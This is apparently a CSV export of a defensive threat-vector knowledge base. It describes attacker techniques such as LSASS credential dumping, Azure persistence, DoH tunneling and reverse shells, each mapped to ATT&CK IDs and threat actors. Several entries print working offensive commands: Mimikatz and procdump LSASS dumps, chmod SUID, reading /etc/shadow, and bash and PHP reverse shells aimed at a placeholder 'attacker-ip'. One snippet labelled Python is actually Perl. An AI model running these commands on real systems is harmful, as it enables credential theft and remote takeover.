",3,2025-06-17,2025-09-08,,,"{'support::enabled': ['2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1119, T1078"
2d0beed6-6520-4114-be1f-24067628e93c,Manipulation of credentials stored in LSASS,Threat Vectors,clear,"Credentials can be stored in the Local Security Authority Subsystem
Service (LSASS) process in memory for use by the account. LSASS stores
credentials in memory on behalf of users with active Windows sessions.
LSASS can store user or system credentials in several different ways: 
Reversibly encrypted plaintext, Kerberos Tickets, NT hashes or LM
hashes. 

The threat actors can harvest these credentials with an administrative
user or SYSTEM. Administrative accounts are used by users to carry out
tasks that require special permissions, such as installing software or
renaming a computer and they need higher administrative privileges. In
the most cases the threat actors are using different tools to manipulate
the credentials in LSASS process in memory, for example: Mimikatz, Cobalt
Strike, Impacket, Metasploit, PowerSploit, Empire, Pwdump, Dumpert and
others.

Mimikatz is a tool that allows an attacker to extract clear text passwords,
hash values, and Kerberos tickets from LSASS. The tool can be used to
retrieve password information for a user account that is currently logged
into a system, or to extract the hashes of all user accounts on a system,
which can then be used to perform offline password cracking.

By manipulating LSASS, an attacker can gain access to sensitive information,
such as passwords and other credentials, and use that information to
compromise the security of a system or network.

For example, on thetarget host threat actors can use procdump:

procdump -ma lsass.exe lsass_dump

Example for a local credential dumping from LSASS memory with Mimikatz
sekurlsa:

sekurlsa::Minidump lsassdump.dmp
sekurlsa::logonPasswords

Example for process dumping memory of lsass.exe to obtain credentials.
Threat actors are using dynamic-link libraries (DLLs) like Rundll32 to
manipulate the process in LSASS memory.

rundll32 C:\windows\system32\comsvcs.dll MiniDump lsass.dmp

OR

process == rundll32.exe
&&
command_line_includes ('MiniDump')

Example for a process that access LSASS memory:

process == ('powershell.exe' || 'taskmgr.exe' || 'rundll32.exe' || 'procdump.exe' 
|| 'procexp.exe' || [other native processes that don’t normally access LSASS]) &&
cross_process_handle_to ('lsass.exe')

Threat actors can use PowerShell scripts to request process access to
lsass.exe process (an example for access to PROCESS_ALL_ACCESS – 0x1F0FFF
process):

$Handle = [Uri].Assembly.GetType('Microsoft.Win32.NativeMethods')::OpenProcess(0x1F0FFF, $False, (Get-Process lsass).Id)

If the key value pair in the registry for LSASS is changed to 1, this
is an indicator that the passwords are stored in cleartext in LSASS memory.

Example for a DWORD in the registry: 

HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/SecurityProviders/WDigest/UseLogonCredentia
",4,2023-01-31,2025-10-01,,,,"[Mobile] APT28, APT28, [ICS] FIN6, FIN6, [Enterprise] Leviathan, APT40, [Enterprise] Fox Kitten, Fox Kitten, [Enterprise] MuddyWater, MuddyWater","T1003.001, T1218.011, T1098, T1003"
1c1c9665-a30e-479b-bd80-1afb7b53ac83,Compromised software packages,Threat Vectors,clear,"Compromised software packages in a supply chain attack refer to the
intentional or unintentional inclusion of malicious code or vulnerabilities
in software components, libraries, or dependencies that are used by multiple
organizations or products. This type of attack targets the software supply
chain, which includes all the organizations, people, and processes involved
in designing, developing, testing, building, delivering, and maintaining
software.

### Types of compromised software packages

- Malicious libraries or dependencies: Open-source or third-party libraries
that contain malicious code, which can be used to steal sensitive data,
disrupt operations, or create backdoors.
- Tampered software updates: Legitimate software updates that have been
compromised by an attacker, allowing them to inject malware or backdoors
into the updated software.
- Infected software components: Software components, such as DLLs or
executables, that contain malware or vulnerabilities, which can be
used to compromise the entire system.
- Fake or counterfeit software: Software that is intentionally designed
to mimic legitimate software, but contains malware or vulnerabilities.
- Typosquatting attacks: This type of approach includes a small changes
in the name of the software packages. In this way is very difficult to
recognise a malicious from a legitimate software package for installation.
The packages with names similar to legitimate ones could be deceiving and
easily lure the victim to download and use them. 

### Dependency poisoning 

Threat actors can add intentional vulnerabilities to open-source libraries
by exploiting their accessibility. Such example is typosquatting attacks
in which an adversary uploads malicious packages with names similar to
popular NPM or PyPI libraries to trick developers into downloading
the wrong one. Threat actors can also inject malicious code into trusted
libraries,for example: Log4j, NPM, or PyPI, compromising thousands of
applications that rely on them. This type of attack, often referred
to as “supply chain poisoning,” can have a massive impactful
consequences. ref [2].  

It's recommended a security officer to establish robust policies for
evaluating, approving, and managing open-source libraries. This includes
selecting packages from trusted sources and monitoring their activity.",1,2025-04-15,2025-04-22,,,{'atomicity::implements': ['78683822-44dc-41ac-8fef-b5f0968743c9']},"UNC2452, APT29, [Enterprise] APT29, [Enterprise] HAFNIUM, HAFNIUM, [Enterprise] menuPass, APT10, [Enterprise] Ke3chang, APT15, [ICS] Lazarus Group, Lazarus Group","T1546.016, T1195"
d24fcc84-0e1e-41e1-8d0e-6ee9f8c6a068,Azure - File Share Mounting,Threat Vectors,clear,"In the following threat vector, adversaries leverage Azure Storage Account File 
Shares via NFS or SMB mounts to facilitate or escalate attacks.

## Example Attack Scenario

A typical scenario begins with an attacker stealing or hijacking privileged credentials, 
for example through a “Pass the Cookie” attack on a global administrator account. 
After obtaining administrative access, the adversary extends permissions to external 
users and assigns them high-level roles within the Azure tenant. Leveraging this 
privileged access, the adversary mounts Azure file shares to their own infrastructure, 
laying the groundwork for:
- Massive data exfiltration through direct access to sensitive storage.
- Encrypting and holding file shares hostage for ransom (ransomware).
- Stealthily manipulating or deleting critical business data, including Azure backup sets.

## Attack Goals and Impact

The adversary’s core objectives when mounting file shares are:
- **Data Exfiltration:** Copying sensitive or proprietary data undetected from the 
cloud environment via NFS or SMB mount.
- **Ransomware Operations:** Encrypting contents of file shares directly, disrupting 
business continuity and demanding ransom payments for decryption.
- **Persistence and Shadow IT:** Creating redundant access paths or mirroring content 
to maintain long-term presence within the victim's environment.
- **Operational Disruption:** Deleting or corrupting critical files and backups 
to elevate operational risks and pressure response teams.

## Attack Flow and Methodology

The typical methodology for File Share Mounting attacks involves these steps:
- **Credential or Key Theft:** Adversaries obtain necessary Secrets, Shared Access 
Signatures (SAS), or access keys for a Storage Account, or elevate privileges to 
write and mount shares.
- **Generate/Enumerate Connection Strings:** Using their access, attackers create 
connection strings to Azure Storage File Shares, selecting NFS or SMB protocols 
as supported.
- **Mount File Shares:** The adversary mounts the target file shares to attacker-controlled 
machines or servers, treating Azure storage as a local/network drive.
- **Execute Objectives:** With direct file system access:
  - Download or exfiltrate data covertly.
  - Upload and execute ransomware, encrypt data, or sabotage backups.
  - Copy, modify, or delete content to facilitate further lateral movement or persistent threats.
- **Evasion:** These actions often evade Azure default audit logging, as connections 
to the mounted file shares are typically not logged within Azure's native monitoring 
tools by default, reducing detection opportunities.

## How the Adversary Generates the Connection String
The connection string typically contains the Storage Account name, File Share name,
and authentication tokens or keys (e.g., SAS tokens or storage account keys).

The attacker must have access to these authentication credentials, which can be 
obtained through compromise or misconfiguration.
With these credentials, the attacker constructs a connection string formatted like:

For SMB:
`\\<storage_account_name>.file.core.windows.net\<file_share_name>`
along with the storage account key or SAS token used for authentication.

For NFS:
A mount command such as
`mount -t nfs <storage_account_name>.file.core.windows.net:/<file_share_name> <local_mount_point>`.

Once mounted, the adversary can read, write, delete, or exfiltrate files directly from the 
file share as though it were a local drive.
",1,2025-09-09,2025-09-10,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2743bf18-3b86-4721-bf3e-153dcda0b149'], 'support::synergize': ['942ed69c-700a-469a-9591-07b87815a909', '85c8e0dd-b012-402d-bb09-5d354c16ebb9'], 'sequence::preceeds': ['518ff777-f10d-4201-9e54-2779c31c512e']}",,"T1039, T1530, T1021.007"
52cd3405-ddd8-40cd-be83-640a21c2b4c4,Abuse of special permission via chmod on files,Threat Vectors,clear,"Attackers leverage the `chmod` utility to set the SUID (Set Owner User ID), 
the SGID (Set Owner Group ID), or the Sticky bit on executables or scripts. 
By abusing these bits, an adversary can temporarily inherit root- 
or group-level privileges when the affected file is executed.  

This effectively grants them elevated rights that can be used to move laterally 
within the environment, access or exfiltrate sensitive data, or escalate 
privileges to maintain a stronger foothold on the system.  

Examples of SUID, SGID, and Sticky bit abuse:

SUID shell: Attackers can create a file with the setuid bit set and owned
by the root user, and then use that file to gain root privileges and 
execute a shell with root privileges.

SGID exploit: Attackers can find a file with the setgid bit set and owned
by a group that has elevated privileges, and then use that file to gain the
privileges of that group.

Sticky bit exploit: Attackers can set the sticky bit on a file to prevent
it from being deleted or renamed, and then use that file to store malicious
code or data.

In many Linux-based distributions (and similarly on macOS systems), 
`chmod` is widely available and not restricted in typical configurations. 
Attackers can take advantage of this by running commands such as:

```bash
chmod u+s /path/to/executable
```

or

```bash
chmod g+s /path/to/executable
```
Depending on permissions misconfigurations, these commands may succeed if the 
account in use has the necessary rights or if the system’s sudo settings 
are overly permissive.  

Once the SUID or SGID bit is set on a critical binary, any user running that 
binary subsequently executes it with elevated privileges. Threat actors have 
been observed employing this technique to gain root-level access, tamper with 
system logs, exfiltrate proprietary data, or introduce backdoors for persistence.  
",1,2025-01-13,2025-01-16,,,,"[Enterprise] TeamTNT, TeamTNT, [ICS] APT38, Lazarus Group, [ICS] Wizard Spider, UNC1878",T1548.001
06523ed4-7881-4466-9ac5-f8417e972d13,Using a Windows command prompt for credential manipulation,Threat Vectors,clear,"Threat actors may use Windows commad prompt commands to search for, access
in order to manipulate (create, modify, delete, read) user's credentials
locally or in a domain. For example, they can extract user's passwords from
Credential Manager. Windows Credential Manager is a store with all user's
saved passwords automatically during user daily work. It provides an
interface from where the credentials can be managed. To access Credential
Manager, the threat actor needs to elevate his previleges to administrator
and run the command promt console with ""Run as administrator"".

Cmdkey.exe is a command-prompt utility which can create, list, and delete
stored user names and passwords or credentials. It's usually located in the 
%SYSTEM% sub-folder and its usual size is around 13,850 bytes.

Example for try to gain user's details with cmdkey from Windows Credential
Manager:

cmdkey /list:testTarget

The command returns the Target(testTarget), Type(Domain Password), and the
Username(testUser).

A threat actor can also manipulate the Credential Manager database, for
example to add, modify or delete credentials from manager sections. It is
possible to add an Internet or network address, user name, password and
others.

Example for adding of entry in Credential Manager. With the command below
a threat actor can add username-password key pair for access to specific
system.

cmdkey /add:computer-name /user:user-name /pass:your-password

Example for deletion of entry in Credential Manager. A threat actor fist
execute list command to see all potential targets and select an entry for
deletion.

cmdkey /list
cmdkey /delete:target-name

Another approach to search and retrieve user's credentials with command
promt is for example with net utility. Net utility executed via the network 
is used to query for user's password. The passwords can be storred on shared
network drives or locally.

Example:

net use \\unc\path /user:username password

or 

net use \\%userdnsdomain% /user:%userdomain%\%username% *

The asterisk at the end forces to ask for password.

With net utility a threat actor can also modify already existing user name
or password or to delete the existing credentials entry. 

Examples: 

net user <username> *
<type a new password>
<retype the new password to confirm>

The command below will set the password to blank:
net user username """" 

The following command will remove the password for the user with the
specified userneme:

net user <username> /passwordreq:no
",3,2023-01-26,2023-01-26,,,,"[Enterprise] Deep Panda, APT19, [Enterprise] APT32, APT32, [Enterprise] APT39, APT39, [ICS] Dragonfly, ENERGETIC BEAR, [ICS] FIN6, FIN6, [ICS] FIN7, FIN7, [Enterprise] Fox Kitten, Fox Kitten, [ICS] OilRig, OilRig, [Enterprise] APT29, UNC2452","T1059.003, T1098.001"
50c7e353-ac1c-48a7-8c98-2515b45f31f4,Persistence through automation runbooks in Azure,Threat Vectors,clear,"Persistence through automation runbooks in Azure is a robust and often-overlooked 
technique that allows attackers to maintain privileged access in cloud environments 
by leveraging Azure Automation Accounts and their associated runbooks.

### Attack Flow and Techniques

**1. Attack Lifecycle**  
- The attacker compromises an Azure account or system and escalates privileges, 
often to Global Administrator.
- After initial access is revoked or remediated, the attacker uses Automation Accounts 
to regain or maintain access to the Azure tenant.

**2. Runbook Creation and Modification**  
- Attackers create a new Automation Account with excessive privileges (such as ""User Administrator"" or ""Subscription Owner"") 
or leverage an existing one.
- A malicious runbook (typically a PowerShell script) is uploaded or an existing runbook is modified. These scripts can:
  - Create new Azure AD users or service principals with high privileges.
  - Deploy payloads (e.g., Cobalt Strike beacons) on Azure VMs.
  - Mimic legitimate processes through naming conventions (e.g., ""SplunkDev"" for Automation Account, ""AzureAutomationMonitor"" for runbook).

**3. Webhook Integration**  
- The malicious runbook is linked to a webhook, enabling remote execution via HTTP 
POST requests without direct authentication.
- This allows attackers to regain access on demand, even after their original accounts 
are removed.

**4. Privilege Retention and Escalation**  
- Automation Accounts are configured with password or certificate-based authentication, 
providing multiple avenues for re-entry.
- Attackers may assign or retain excessive permissions to ensure the malicious runbook 
can escalate privileges or create new backdoor accounts.

**5. Hybrid Runbook Workers**  
- Attackers may use Hybrid Runbook Workers, which run outside Azure’s sandbox and 
are not subject to the same execution time limits. This allows for more complex 
or long-running malicious tasks.

**6. Backdooring Packages and Runtime Environments**  
- Beyond runbooks, attackers can backdoor the packages and runtime environments 
(modules and Python packages) that support Automation Accounts. Malicious code can 
be embedded in these components, providing even deeper persistence.
",1,2025-05-20,2025-05-21,,,,,"T1098, T1204"
707bf160-5d78-42cc-85d3-e4831f62357c,Scheduled tasks to execute binaries,Threat Vectors,clear,"A threat actor can use scheduled tasks to execute binaries such as LOLBINs
or malware. LOLBINs is short for 'living off the land binaries', which
means that the threat actors often use native Windows binaries to try to
hide malicious activity.

A scheduled task to execute a binary is a way for an attacker to ensure 
that binaries of their choosing and with their settings are run
automatically at a specific time or on a regular basis. Scheduled tasks can
be set up to run a malicious binaries or LOLBINs in a number of ways, such
as through the use of the built-in task scheduler in Windows. Once the
scheduled task is created, it will run the specified binary at the
designated time. It is important to regularly check and disable any
suspicious scheduled tasks to protect against this type of attack.
",4,2022-12-14,2022-12-20,,,,"[Enterprise] HAFNIUM, HAFNIUM, [Enterprise] APT29, UNC2452, [ICS] FIN7, FIN7, [Enterprise] Gamaredon Group, Gamaredon Group",T1053.005
b1593e0b-1b3b-462d-9ab6-21d1c136469d,Azure - Gather Resource Data,Threat Vectors,clear,"The “Gather Resource Data” technique is a key part of the reconnaissance phase in 
attacks against Azure environments. This activity focuses on enumerating information 
about resources within a target Azure tenant or subscription to support subsequent 
attack phases.

#### Example Attack Scenario

A threat actor gains access to a compromised identity in an Azure environment, such 
as via phishing or a leaked credential. Using this access, the attacker enumerates 
accessible resources (e.g., virtual machines, storage accounts, databases, and identity 
configurations) by executing read operations like `{resource}/*/read`. For example, 
if the account has Reader or even limited permissions, the attacker can list resource 
groups, virtual machines, Key Vaults, storage accounts, and see details such as 
configurations, names, and metadata. They might also list the names of secrets or 
certificates in a Key Vault—while unable to access the contents without elevated 
permissions, this reconnaissance helps prioritize attack targets.

#### Attack Goals and Impact

- **Goals:**
  - Develop a comprehensive map of the organization’s Azure environment.
  - Identify high-value resources (e.g., storage accounts with sensitive data, Key 
  Vaults, privileged identities).
  - Find weakly configured, over-permitted, or exposed resources (public endpoints, 
  misconfigured access policies).
  - Inform next stages of the attack (privilege escalation, lateral movement, data theft).

- **Potential Impact:**
  - **Accelerated compromise:** With detailed resource and configuration information, 
  attackers can quickly focus on the most lucrative or vulnerable targets.
  - **Increased stealth:** Attackers can tailor subsequent steps to avoid detection—targeting 
  overlooked or poorly monitored resources.
  - **Data exposure:** Identification of exposed storage or secrets can result in 
  immediate or subsequent sensitive data breaches.

#### Attack Flow and Methodology

1. **Automated Enumeration:** Utilizing Azure CLI, PowerShell (e.g., `Get-AzResource`, `az resource list`), 
REST APIs, or scripts, the attacker lists:
  - Resource groups and their contents
  - Virtual machines, storage accounts, databases, and Key Vaults
  - Permissions and access policies associated with resources
2. **Asset Profiling:** The attacker collects details on configurations, public IPs, 
RBAC permissions, and metadata for each resource.
3. **Vulnerability Identification:** Analysis focuses on resources where permissions, 
network exposure, or configurations suggest potential for privilege escalation or data access.
4. **Preparation for Next Stages:** The attacker plans lateral movement, privilege 
escalation, or direct attacks on data, using the knowledge obtained to target weak points.
",2,2025-08-07,2025-09-04,,,"{'sequence::succeeds': ['66aafb61-9a46-4287-8b40-4785b42b77a3', '9bb31c65-8abd-48fc-afe3-8aca76109737']}","Volt Typhoon, HAFNIUM, FIN13, [Enterprise] Salt Typhoon","T1526, T1087, T1552.001, T1530"
b5e8300c-6887-48c2-a18d-e3d910478fe8,Retrieve browser cookie with Python,Threat Vectors,clear,"Cookies contain information stored in a user browser, such as session state and
user preferences. There are multiple ways to retrieve browser cookies using Python.

Here are several commonly used methods in Python to obtain browser cookies
along with example code:

1. Use the Selenium library to retrieve browser cookies.

  from selenium import webdriver

  Initialize the browser driver
  driver = webdriver.Chrome()

  Open the webpage
  driver.get(""http://www.example.com"")

  Retrieve browser cookies
  cookies = driver.get_cookies()

  Print the cookies
  for cookie in cookies:
      print(cookie)

  Close the browser
  driver.quit()
  
2. Using the browser developer tools to retrieve browser cookies

  import requests

  send HTTP requests
  response = requests.get(""http://www.example.com"")

  get response about Cookies
  cookies = response.cookies

  print out Cookies
  for cookie in cookies:
      print(cookie.name, cookie.value)   
      
3. Saving cookies from the browser developer tools as a HAR (HTTP Archive) file

  In the Network panel of the browser developer tools, select a request, right-click,
  and choose “Save All as HAR with Content” to save the request and response as a
  HAR file. Then, use Python to parse the HAR file and extract the cookie information.

  The following is an example code demonstrating how to parse browser cookies using a HAR file:

  import json

  read HAR file
  with open(""example.har"", ""r"") as file:
      har_data = json.load(file)

  extract Cookies information
  cookies = har_data[""log""][""entries""][0][""response""][""cookies""]

  print out Cookies
  for cookie in cookies:
      print(cookie[""name""], cookie[""value""])
    
    
4. Use the browsercookie Python module that loads cookies used by the web browser into a
   cookiejar object. This can be useful to download the same content seen in the
   web browser without needing to login.
    
  import urllib.request
  public\_html = urllib.request.urlopen(url).read()
  opener = urllib.request.build\_opener(urllib.request.HTTPCookieProcessor(cj))
  ",1,2024-11-05,2024-11-05,,,"{'sequence::succeeds': ['ec8201d4-c135-406b-a3b5-4a070e80a2ee'], 'atomicity::implements': ['b0d6bf74-b204-4a48-9509-4499ed795771']}",,T1111
901dd804-00cc-4034-85aa-3d10e257c16c,DNS over HTTPS tunneling exfiltrates data or communicates to C&C server,Threat Vectors,clear,"DNS over HTTPS (DoH) tunneling is a technique used by threat actors
to exfiltrate data or communicate to a Command and Control (C&C)
server. The data exchange and transfer between the victim and the
attacker's server can include - data exfiltration (stolen data) as
confidential documents or files, PIIs, financial data or intellectual
property. The data flow can be also an administrative traffic like
covert C&C communication, for example - chat or messaging traffic,
file (malicious payload) transfers, system control, manipulation
instructions and other possible signaling or instructions transfer.

DoH is a protocol that encrypts DNS requests and responses, making
it more difficult for third parties to intercept and manipulate DNS
traffic. However, threat actors have found a way to exploit this
protocol for malicious purposes ref [1].      

In a DoH tunneling attack, the threat actor uses the DoH protocol
to encapsulate malicious data, such as stolen credentials, sensitive
information, or malware, within DNS requests. The encrypted DNS requests
are then sent to a C&C server, which can be hosted on a compromised domain
or a domain controlled by the threat actor ref [2].    

A threat actor can use some of the following initial access techniques
or methods to perform DNS over HTTPS tunneling:   

- Compromises a device: Gains access to a victim's device, either through
phishing, exploiting vulnerabilities, or using malware.
- Installs malware: Installs malware on the compromised device, which can
be designed to collect sensitive information, such as login credentials
or personal data.
- Configures DoH: Configures the device to use DoH, either by modifying
the device's DNS settings or by installing a malicious DoH client.
- Encapsulates data: Encapsulates the stolen data within DNS requests,
using techniques such as:
- Data encoding: Encoding the data using techniques like Base64 or
hexadecimal encoding.
- Data fragmentation: Breaking the data into smaller fragments and
sending them across multiple DNS requests.
- Sends DNS requests: Sends the encrypted DNS requests to the C&C
server, which can be hosted on a compromised domain or a domain
controlled by the threat actor.
- Exfiltrates data: The C&C server receives the DNS requests, extracts
the encapsulated data, and stores or forwards it to the threat actor.
",2,2025-04-22,2025-05-08,,,,"[Enterprise] APT3, APT3","T1572, T1036, T1041, T1190, T1566"
777e22c5-e47d-42a2-a803-42a101dee575,IP Discovery in Azure,Threat Vectors,clear,"IP Discovery in the context of Azure refers to an adversary’s technique for identifying 
the public IP addresses associated with Azure resources. This activity is classified 
in the Azure Threat Research Matrix (ATRM) under **reconnaissance** tactics, because 
it is often one of the first steps attackers perform to understand the accessible 
surface of a target Azure environment.

#### Attack Flow and Methodology

1. **Initial Reconnaissance**  (see terrain)
  The attacker needs valid credentials or otherwise access to an Azure environment 
  
2. **Enumerating Resources**  
  Using the Azure Portal, the Azure CLI, PowerShell, or Azure REST APIs, they enumerate 
  resources—especially focusing on Virtual Machines (VMs) and Network Interfaces (NICs).

3. **Querying for IP Information**  
  The attacker issues read requests (such as `az network nic list`, `Get-AzNetworkInterface`, 
  or relevant API calls) to retrieve detailed information about NICs. Each NIC 
  object includes properties for associated public and private IP addresses.

4. **Mapping IPs to VMs**  
  From the NIC information, the adversary can link public IPs back to specific 
  VMs or other endpoints, thereby building a map of accessible resources and potential 
  entry points.

#### Attack Goals and Impact

- **Surface Mapping:** Generate a list of exposed public IP addresses and their 
associated Azure resources.
- **Prioritizing Targets:** Identify potentially vulnerable endpoints for direct 
attack (RDP, SSH, web services) or for scanning later.
- **Avoiding Detection:** Reconnaissance is “low and slow”—often blends in with 
administrative activity, making detection challenging unless closely monitored.

#### Example Attack Scenario

1. **Enumeration:**  
  ```
  az network nic list --query ""[].{Name:name, IP:ipConfigurations[].publicIpAddress.id}""
  ```
  Or use the Azure REST API to enumerate all NICs and their attached public IPs.

2. **Data Correlation:**  
  Map discovered IPs to VMs using the relationships expressed in the Azure resource objects.

3. **Follow-Up:**  
  The attacker now has a list of direct IPs to probe for vulnerabilities 
  (e.g., open RDP or SSH ports, misconfigured firewalls).
",1,2025-07-30,2025-08-04,,,,,"T1078, T1526, T1528"
75415bc5-6615-487e-a69c-7a4ffc196996,Lateral movement using Impacket framework,Threat Vectors,clear,"Threat actors conduct lateral movement with valid network credentials
obtained from credential harvesting. To conduct lateral movement more
efficiently, they typically use modules from the publicly available
Impacket framework ref [1].    

Some of the activities during the lateral movement might be:

- Enumerate the volume of a device (example: PS get-volume), 
  access volumes via network shares like \\127.0.0.1\ADMINS$\__  
- Copying critical registry hives that contain password hashes
  and computer information.  
- Downloading files directly from actor-owned infrastructure
  (example: cmdlet: DownloadFile)  
- Extract both system and security event logs into operational
  directory (example: Win32_NTEventlogFile cmdlet) 

Variety of reports and analysis show that the threat actor commonly
deletes files used during operational phases seen in lateral movement.

In some cases the threat actors may try to manipulate the Group Policies
to hide their traces. For example, the registries which are related to
the access of the System Registries. They may also try to turn off `Audit
object access` for successful and failed access events. ref [2, 3]  
",1,2024-09-17,2024-09-18,,,{'sequence::succeeds': ['3b1026c6-7d04-4b91-ba6f-abc68e993616']},"[Enterprise] Ember Bear, DEV-0586","T1021, T1059.001, T1552.002"
3b1026c6-7d04-4b91-ba6f-abc68e993616,Abusing Lolbins to Enumerate Local and Domain Accounts and Groups,Threat Vectors,clear,"Adversaries may attempt to enumerate the environment and list all
local system and domain accounts or groups.  
To achieve this purpose, they can use variety of tools and techniques.  
Their goal is reconnaissance, gathering of user's account information on 
the system or in the domain and further usage of accounts with higher 
privilege access.


### For Windows OS:

On Windows platforms threat actors can use the net utility or dsquery,
as examples as lolbins. Net utility commands, as examples, are executed
with additional parameters like ""net localgroup"", ""net user"" for
administrators and guest accounts. For domain users and groups net
utility commands are used with the parameter /domain.  

Examples:   

- net user /domain
- net group /domain
- net localgroup on localhost
- net user on localhost
- net localgroup ""Administrators"" on localhost

Executable files net.exe or net1.exe are indicators for accounts enumeration.
""Net1.exe"" resides in ""C:\Windows\System32"" like ""net.exe"" and indicates process 
known as Net Command or Application Installer. These .exe files are usually related 
to run applications, batch files, and scripts that call Net utility.  

Threat actors may enumerate currently or previously connected users, or a subset
of users as for example administrative users.  

### For Linux OS (including Windows Subsystem for Linux):

Here some example of commands typically used for discovery on accounts 
and groups.

- whoami        #current user (often used in legitimate scripts)
- hostname      #show or set the system's host name
- id            #print real and effective user and group IDs
- uname         #print system information
- arp
- users
- netdiscover
- ifconfig	  #configure a network interface
- nmap
- ps            #report a snapshot of the current processes
- netstat
- uname
- issue
- groups
- tcpdump
- sudo -l
- cat /etc/shadow
- cat /etc/passwd # other command could be used to list the content of the file ex: 'less', 'more' etc.
- cat /etc/group  # Groups
- cat /etc/sudoers # File that allocate system rights to users
- last            # most recent login sessions
- ldapsearch      # Get information from LDAP server
- rpcclient       # Command-line utility used to interact with Microsoft RPC protocol. Could be used to enumerate AD
- finger          #  user information lookup command 
",5,2022-11-10,2025-10-01,,,,"[Enterprise] APT29, UNC2452, [Enterprise] APT1, APT1, [Enterprise] Chimera, [Enterprise] APT32, APT32, [Enterprise] Ke3chang, APT15","T1087.001, T1087.002, T1069.001, T1069.002"
157710ff-962d-4fa3-a516-ac5883f2d5ef,Reverse shell or remote session from compromised host,Threat Vectors,clear,"### Threat vector
A reverse shell is a technique that refers to a situation
where adversaries, who have successfully compromised a system,
establish a connection to their own system or server.
This connection allows the adversaries to gain remote access 
and control over the compromised system, enabling them to 
execute commands and perform malicious actions.  

### Command&Control phases
Below are the phases of how a reverse shell works:  

- System compromise: the adversaries must succeed in compromising
  the security of the system. This may involve exploiting vulnerabilities
  in the software, misconfiguration, tricking the user into running a 
  malicious program, or via other ways.  

- Establishing a reverse connection: Once the system has been compromised,
  the adversaries set up a reverse connection from the compromised system
  to their own. This is often done using a malicious application or script
  that runs on the compromised system and communicates with a server controlled 
  by adversaries.  

- Remote control: With the reverse connection established, adversaries can
  have full or partial access and control over the compromised system. This 
  allows them to execute commands, manipulate files, steal information, install
  additional malware, modify configurations and perform other actions according 
  to their goals.  

### Code examples of reverse shells:

#### Example 1 - Bash
      
  Start a listener on the attackers machine
  `nc -nlvp 4444`

  On the target machine, use Bash to establish a connection back to the listener
  `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`

  This code assumes that the attacker has started a listener on their machine using
  the nc (netcat) utility, which is listening on a specified port (in this case, 4444). 
  The second line of code, which is executed on the target machine, uses Bash to open
  a connection back to the listener and establish a command shell. 

#### Example 2 - PHP

  The attacker establishes a command shell on a remote machine by exploiting a
  vulnerability in the target system and using PHP, a server-side scripting language,
  to execute commands on the target machine:

```
  <?php
  // Start a listener on the attacker's machine
  $sock=fsockopen(""attacker-ip"", 4444);
  exec(""/bin/sh -i <&3 >&3 2>&3"");
  ?>
```

The PHP code uses the fsockopen() function to open a connection to the listener and
the exec() function to execute the /bin/sh shell and redirect its input, output, and
error streams to the connection with the listener.

#### Example 3 - Python

This code example can be used to establish a command shell on a remote machine.

Start a listener on the attackers machine
```
  use IO::Socket;
  $|=1;
  $socket = new IO::Socket::INET (
      LocalHost => '0.0.0.0',
      LocalPort => '4444',
      Proto => 'tcp',
      Listen => 1,
      Reuse => 1
  );

  Wait for a connection from the target machine
  $new_socket = $socket->accept();

  Open a command shell on the target machine
  system(""/bin/sh -i <&3 >&3 2>&3"");

  Close the connection
  $new_socket->close();
```
",3,2023-09-27,2025-02-07,,,,"APT29, APT32, [Enterprise] APT37, APT37, FIN6, FIN7, Fox Kitten, APT15, OilRig, Whitefly","T1071.001, T1571, T1572, T1059"
b0d6bf74-b204-4a48-9509-4499ed795771,Pass-the-cookie Attack,Threat Vectors,clear,"Pass-The-Cookie (PTC), also known as token compromise, is a common attack technique
employed by threat actors in SaaS environments. 

A PTC is a type of attack where an attacker can bypass authentication controls by 
compromising browser cookies. At a high level, browser cookies allow web applications
to store user authentication information. 

Specifically, an authentication cookie allows a website to keep the user signed in
and not constantly prompt for credentials every time user clicks a new page.
The server uses the token to recognize the user and confirm they are authenticated 
without requiring the user to re-enter their credentials. Session tokens maintain the
state of the user, allowing them to interact with web services in a stateful manner 
despite the stateless nature of the web.

After authentication to Azure AD via a browser, a cookie is created and stored for
that session. If attackers can compromise a device and extract the browser cookies,
they could pass that cookie into a separate web browser on another system, to be
injected into a new web session to trick the browser into thinking the authenticated
user is present and does not need to prove their identity, bypassing security 
checkpoints along the way.

Because such cookie is also created and stored on a web browser when MFA is in play,
the same technique can handily be used to bypass it.
",1,2024-10-22,2024-11-11,,,"{'sequence::succeeds': ['66aafb61-9a46-4287-8b40-4785b42b77a3'], 'atomicity::implements': ['4a807ac4-f764-41b1-ae6f-94239041d349']}","[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy",T1111
5238718b-13c4-46d7-a84c-d29c77e5d801,GSM interception,Threat Vectors,clear,"GSM interception refers to the unauthorized capture and monitoring of communications 
(calls, SMS, and sometimes data) transmitted over GSM (Global System for Mobile Communications) 
networks. This threat vector exploits inherent weaknesses in the GSM protocol, outdated 
encryption algorithms, and the ability to impersonate legitimate network infrastructure.

## How GSM interception works

**Key Techniques:**

- **IMSI Catchers (Fake Base Stations):** Attackers deploy rogue base stations 
(often called IMSI catchers or Stingrays) that mimic legitimate cell towers. Mobile 
devices in the vicinity connect to these fake towers, allowing attackers to capture 
the International Mobile Subscriber Identity (IMSI), track users, and intercept communications.

- **Weak Encryption Algorithms:** Early GSM encryption standards, such as A5/1 and 
A5/2, are now considered weak and can be cracked with modest resources. Attackers 
can eavesdrop on calls and SMS by decrypting intercepted radio signals.

- **Man-in-the-Middle (MitM) Attacks:** By placing themselves between the mobile 
device and the legitimate network, attackers can intercept, alter, or inject communications, 
often without the user’s knowledge.

- **Signaling Exploits:** Vulnerabilities in GSM’s signaling protocols (like SS7) 
can be abused to redirect calls or SMS messages to an attacker, enabling interception 
even if the attacker is not physically near the target.

## Threat impact

- **Eavesdropping:** Attackers can listen to phone calls and read SMS messages, 
compromising user privacy and potentially exposing sensitive or confidential information.

- **Location Tracking:** By capturing IMSI and other identifiers, attackers can 
track a user’s movements in real time.

- **Data Manipulation:** In MitM scenarios, attackers can alter messages or inject 
malicious content during transmission.

- **Fraud and Identity Theft:** Intercepted communications can be used for social 
engineering, phishing, or unauthorized access to accounts (e.g., intercepting SMS-based 
two-factor authentication).

## Real-world examples

